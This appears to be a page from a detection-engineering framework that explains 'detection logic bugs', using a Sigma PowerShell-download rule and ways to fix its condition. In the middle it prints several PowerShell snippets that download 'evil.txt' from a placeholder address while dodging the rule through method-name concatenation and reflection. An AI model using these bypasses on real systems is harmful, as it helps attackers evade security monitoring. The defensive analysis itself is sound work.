# Foundation of Detection Logic Bugs

When the term '**detection rule**' is used, this is unanimous to SIEM, XDR, EDR, etc.

## What is a detection logic bug?

### What is a detection rule (threat **detection rule**)

ADE defines a **detection rule** as a repeatedly running hypothesis test, where the test is a set of conditions specified in the detection rule's logic itself. A detection rule inputs a bucket of records and examines each record in the bucket against these set of conditions. A record may be a log, it may be a summary row in an aggregation of logs, and it may be from the output of another detection rule.


### Detection rule scope and components

The detection rule contains a human interpretable reason for its use (such as 'detect when powershell script downloads a file'). In ADE this purpose is called the rule's **scope**. The detection rule is required to contain a step-by-step process that's interpreted by a machine (so data can be searched). That step-by-step process is the **detection logic** (delivered via query), and in it contains the conditions of the hypothesis test.


Almost every detection rule intentionally outputs a boolean outcome, hit or no hit. Due to this detection rules and hunting rules are considered to hold a hypothesis.

- **Null Hypothesis** conditions *aren’t met* and the records are benign (negative).
- The **Alternative Hypothesis** conditions *are met*  meaning that there are no significant differences between conditions and the records (i.e there's a match), so **when the record meets the conditions of the test it causes the Null to be rejected, and the record is considered as malicious (positive)**. You can swap Null and Alternative around in your thinking, but it is easy to think along the lines of:
    -  The rejection of the Alternative is a successful flow to “benign (negative) Else continue...”.
 	-  The rejection of the Null is a successful flow to a malicious (positive). This is prior to triage verification so it is treated as a *predicted positive* in the confusion matrix, as it's yet to be determined a False Positive or True Positive.

The detection rule's **scope** includes the description, mitre mappings etc, and any meta data that points towards the human interpretable reason for the detection rule (or for the hypothesis test) to exist.

Components such as schedule, suppression, rule run frequency, lookback, filters, and the query etc, are all considered in ADE to be part of the **detection logic** of the rule.  The part that implements the hypothesis test is the detection logic itself, as it is the machine interpretable component of the rule.

When a detection rule is created, the **intention of the creator** is that the detection logic **captures all necessary conditions** that are required to reject the Null Hypothesis belonging to the **scope** of the detection rule when a *Ground Truth* True Positive record is tested. I.e all the necessary conditions required to detect the attacker behaviors/actions included in the **scope**.

In reality, sometimes, there is a flaw, error or fault that exists between the detection rule scope and the detection logic. 


### Bugs in Detection Logic

In programming, a design/logic bug is a **flaw, error, or fault** in software that causes **unexpected, incorrect, or unintended behavior**. 

A bug in **detection logic** can either lead to the generation of **False Negative**s* or *False Positives*. Please note that the ADE framework currently only covers Detection Logic Bug categories which result in **False Negative** generation.

### Detection Logic Bugs that generate False Negatives

In this case, a flaw, error or fault of the detection logic is considered a bug if, under specific conditions in the record, the hypothesis test brings unexpected, incorrect or unintended behavior. This is because the detection logic is expected to contain all conditions that would fulfill the **scope** of the rule.

There may be a **False Negative** generating bug in the **detection logic**, when both of the below are satisfied:
1. An attacker's behaviors/actions fall within a detection rule's **scope**, and

2. The **detection logic** didn't capture these behaviors/actions during the hypothesis test, causing results that contradict to the **scope** when a True Positive is present (or to put it simply, “no hits when there should have been”)

When this occurs the record is determined by the rule to be *benign (negative)* yet it's ground truth classification is as a True Positive. This is the definition of a **False Negative** (a ground truth True Positive predicted as a Negative)


### Detection Logic Bugs and their Rule Bypasses


When there is **prior knowledge** of a bug in the detection logic of a rule, coupled with a working method to produce a **False Negative** by abusing this bug, then the ADE framework considers this working method to be a **Rule Bypass** of the detection rule.

A Detection Logic Bug, when abused, may result in the following outcomes:

1. Evasion (most commonly seen):
   **Impact**: Undetected activity (**False Negatives**)
   - *Rule never fires* due to abuse of the bug
   - Defenders falsely believe coverage of the scope exists
   - Attackers can operate inside of the blind spot that the bugs bring
     
2. Behavioral Steering (less commonly seen):
   **Impact**: Attacker adapts their own activity by stacking multiple **detection rule bypasses** during a kill chain
   - *No longer a single point of failure* in one detection rule, but *many single points of failure* providing an attacker with a pathway for evasion
   - Defenders still believes coverage exists, yet lack various alerting used to build contextual understanding of the present attack (as no alerts)
  

### Example of a Detection Logic Bug and Rule Bypasses

Let’s look at an example whose bug category is already well known in the community.

The Sigma rule [Suspicious PowerShell Download](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_classic/posh_pc_susp_download.yml). Sigma portion included below.

```yaml
title: Suspicious PowerShell Download
id: 3236fcd0-b7e3-4433-b4f8-86ad61a9af2d
related:
    - id: 65531a81-a694-4e31-ae04-f8ba5bc33759
      type: derived
status: test
description: Detects suspicious PowerShell download command
references:
    - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-Bypasses-proxyshell-in-attack.html
author: <Florian Roth (Nextron Systems)>
date: 2017-03-05
modified: 2023-10-27
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    product: windows
    category: ps_classic_start
detection:
    selection_webclient:
        Data|contains: 'Net.WebClient'
    selection_download:
        Data|contains:
            - '.DownloadFile('
            - '.DownloadString('
    condition: all of selection_*
falsepositives:
    - PowerShell scripts that download content from the Internet
level: medium
```

1. What is the **scope**?:
	- Powershell scripts downloading a file from a remote host (internet or local), **scope** is supported by the presence of:
	    - Description states *"Detects suspicious PowerShell download command"*
	    - MITRE ATT&CK Mapping of [T1059.001 Command & Scripting Interpreter - PowerShell](https://attack.mitre.org/techniques/T1059/001/)
2. What is **detection logic**'s hypothesis test?
	- The **detection logic** itself searches for the presence of `Net.WebClient`, `.DownloadString(` and `.DownloadFile(` methods in the `Data` field of the classic PowerShell log (`ps_classic_start`).
	- Therefore the `Alternative Hypothesis` is: *A file is downloaded by a powershell script when*:
		- Condition A: substring `Net.WebClient` exists, AND 
			- Condition B: substring `.DownloadString(` exists, OR
			- Condition C: substring `.DownloadFile(` exists
		- Can be understood as `Hit when A AND (B OR C) == True`
3. What *won't* cause a hit?:
    - Any case of a powershell script block that does **not contain any of the above substrings** will be determined as benign (negative).
4. What would a bug do?:
	- A bug in the **detection logic** might be the reliance on certain substrings
    - Any case of an attacker using powershell script that **does not contain any of the above substrings** that **also results in a file download** is a bug to the rule.
	- I.e It’s in **scope**, achieves the outcome, but is not captured by the hypothesis test in the query.
5. What are the bug(s) in the **detection logic** above?:
	- The reliance on substrings that are mutable by the attacker, and
	- The omission of other methods in powershell to download files.
	- In ADE this falls under the bug categories, respectfully:
		- **ADE1-01 Reformatting in Actions - Substring Manipulation**
		- **ADE2-01 Omit Alternatives - Method/Binary**

#### Bug 1: reliance on substrings that are mutable by the attacker.

##### Bypass 1: Method name obfuscation followed by variable usage

> ADE Bug Category: Reformatting in Actions - Substring Manipulation

```PowerShell
$url = "ADDRESS\evil.txt";
$wc = New-Object Net.WebClient;
$methodName = "Down" + "loadString";
$file = $wc.$methodName($url);
Set-Content -Path "DIRECTORY_TO_WRITE_TO\evil.txt" -Value $file
```

##### Bypass 2: Method name obfuscation followed by variable usage (Short)

> ADE Bug Category: Reformatting in Actions - Substring Manipulation

```PowerShell
$url = "ADDRESS\evil.txt";
$wc = New-Object Net.WebClient;
$wc.("Download" + "File")($url,"DIRECTORY_TO_WRITE_TO\evil.txt")
```

#### Bug 2: Omission of other methods in powershell to download files.

##### Bypass 1: Taking advantage of string match reliance, and reflecting via InvokeMember

> ADE Bug Category: Omit Alternative Methods - Method/Binary

```PowerShell
$url = "ADDRESS\evil.txt";
$wc = New-Object Net.WebClient;
$file = $wc.GetType().InvokeMember("DownloadString","InvokeMethod,Public,Instance",$null,$wc,@($url));
Set-Content -Path "DIRECTORY_TO_WRITE_TO\evil.txt" -Value $file
```

Look *carefully* at the Sigma rule and the hypothesis test notes above. *Condition B* is an exact match to `.DownloadString(` and not `DownloadString`, due to the inclusion of the `.` and `(` characters in the query, it opens the **detection rule** up to missing an attacker reflecting `DownloadString` via `InvokeMethod`. Simple but real bug in a SIEM rule used in vendor tooling *today*.


##### Bypass 2: Taking advantage of string match reliance, and utilizing GetMethods

> ADE Bug Category: Omit Alternative Methods - Method/Binary

```PowerShell
$url = "ADDRESS\evil.txt";
$wc = New-Object Net.WebClient;
$method = $wc.GetType().GetMethods() | Where-Object { $_.Name -eq "DownloadString" -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq "String" };
$file = $method.Invoke($wc, @($url));
Set-Content -Path "DIRECTORY_TO_WRITE_TO\evil.txt" -Value $file
```

---

### Fixing the bug

Recall the hypothesis test:
- Condition A: substring `Net.WebClient` exists, AND 
- Condition B: substring `.DownloadString(` exists, OR
- Condition C: substring `.DownloadFile(` exists
- Can be understood as `Hit when A AND (B OR C) == True`

In the example, there were two bugs.

1. The reliance on substrings that are mutable by the attacker
	- `ADE Bug Category: Reformatting in Actions - Substring Manipulation`
2. The omission of other methods in powershell to download files.
		- `ADE Bug Category: Omit Alternative Methods - Method/Binary`

The key issue that results in these was the chaining of `Net.WebClient` prior to the `OR` statement `".DownloadString(" OR ".DownloadFile("`. Because `.DownloadString(` and `.DownloadFile(` can be obfuscated or replaced very easily in classic PowerShell, even with the `.` and `(` characters removed from the match, an attacker never needs to obfuscate `Net.WebClient`: under `all of selection_*` (see the [Sigma search specification](https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-rules-specification.md)), breaking either selection is enough to suppress the hit.

The fastest fix to this is to change the condition to one of:
```yaml
condition: 1 of selection_*
```
or
```yaml
condition: selection_webclient or selection_download
```
However, there may be some cases where `Net.WebClient` can be reformatted or alternative APIs/methods be used, so the condition change narrows the bug rather than closing it. For a rule that takes a different approach to these actions, and has bugs of its own, see the Sigma rule [Potential AMSI Bypass Script Using NULL Bits](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_script/posh_ps_amsi_null_bits_bypass.yml).


### Continue to [Detection Logic Bug Taxonomy](../taxonomy/overview.md)

There are multiple types of detection logic bugs, each with their own examples and bypasses. View the Detection Logic Bug Taxonomy for definitions and examples of each.
